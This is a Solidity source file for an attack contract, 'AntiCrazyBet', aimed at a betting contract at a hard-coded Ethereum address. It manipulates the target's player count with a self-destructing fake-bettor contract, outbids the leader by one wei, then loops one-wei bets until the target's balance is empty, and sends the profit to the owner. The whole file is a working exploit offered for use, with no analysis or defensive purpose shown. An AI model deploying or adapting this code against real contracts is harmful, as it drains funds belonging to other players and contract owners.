pragma solidity ^0.5.0;

interface TargetInterface {
    function getPlayersNum() external view returns (uint256);
    function getLeader() external view returns (address payable, uint256);
}

contract PseudoBet {
    constructor(address payable targetAddress) public payable {
        (bool ignore,) = targetAddress.call.value(msg.value)("");
        ignore;
        selfdestruct(msg.sender);
    }
}

contract AntiCrazyBet {
    
    address payable private constant targetAddress = 0xE0C0c6bE9a09c9df23522db2b69D39Ccb3c3DC98;
    address payable private owner = msg.sender;
    
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
    
    constructor() public payable {
    }
    
    function ping(bool _keepBalance) public payable onlyOwner {
        uint256 ourBalanceInitial = address(this).balance;

        TargetInterface target = TargetInterface(targetAddress);
        
        uint256 playersNum = target.getPlayersNum();
        require(playersNum > 0);
        
        if (playersNum == 1) {
            (new PseudoBet).value(1 wei)(targetAddress);
        }
        
        (, uint256 leaderBet) = target.getLeader();
        uint256 bet = leaderBet + 1;
        
        (bool success,) = targetAddress.call.value(bet)("");
        require(success);
        
        for (uint256 ourBetIndex = 0; ourBetIndex < 100; ourBetIndex++) {
            if (targetAddress.balance == 0) {
                break;
            }

            (bool anotherSuccess,) = targetAddress.call.value(1 wei)("");
            require(anotherSuccess);
        }
        
        require(address(this).balance > ourBalanceInitial);
        
        if (!_keepBalance) {
            owner.transfer(address(this).balance);
        }
    }
    
    function withdraw() public onlyOwner {
        owner.transfer(address(this).balance);
    }    
    
    function kill() public onlyOwner {
        selfdestruct(owner);
    }    
    
    function () external payable {
    }
    
}